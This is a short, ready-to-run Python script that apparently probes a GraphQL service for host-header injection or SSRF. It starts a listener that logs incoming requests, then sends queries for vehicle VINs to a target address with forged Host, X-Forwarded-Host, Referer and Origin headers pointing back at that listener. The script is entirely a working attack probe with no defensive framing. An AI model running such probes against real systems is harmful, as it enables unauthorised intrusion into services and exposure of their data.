import http.server, socketserver, threading, requests, time
HOST_IP="10.252.3.20"; PORT=19322; hits=[]
class H(http.server.BaseHTTPRequestHandler):
    def _h(self):
        n=int(self.headers.get("Content-Length",0) or 0); body=self.rfile.read(n) if n else b""
        hits.append((self.command,self.path,dict(self.headers),body[:120]))
        self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
    do_GET=_h; do_POST=_h
    def log_message(self,*a): pass
class S(socketserver.TCPServer): allow_reuse_address=True
srv=S((HOST_IP,PORT),H); threading.Thread(target=srv.serve_forever,daemon=True).start()
print("listening",HOST_IP,PORT)
URL="http://10.225.139.2:8080/graphql"
hdrs=[
 {"Host":f"{HOST_IP}:{PORT}"},
 {"Host":f"http://{HOST_IP}:{PORT}"},
 {"X-Forwarded-Host":f"{HOST_IP}:{PORT}"},
 {"X-Forwarded-Server":f"{HOST_IP}:{PORT}"},
 {"X-Original-Host":f"{HOST_IP}:{PORT}"},
 {"Referer":f"http://{HOST_IP}:{PORT}/x"},
 {"Origin":f"http://{HOST_IP}:{PORT}"},
]
for h in hdrs:
    try: requests.post(URL,json={"query":"{vehicles{vin}}"},headers=h,timeout=4)
    except Exception: pass
time.sleep(2); srv.shutdown()
print("hits",len(hits))
for h in hits: print(h)
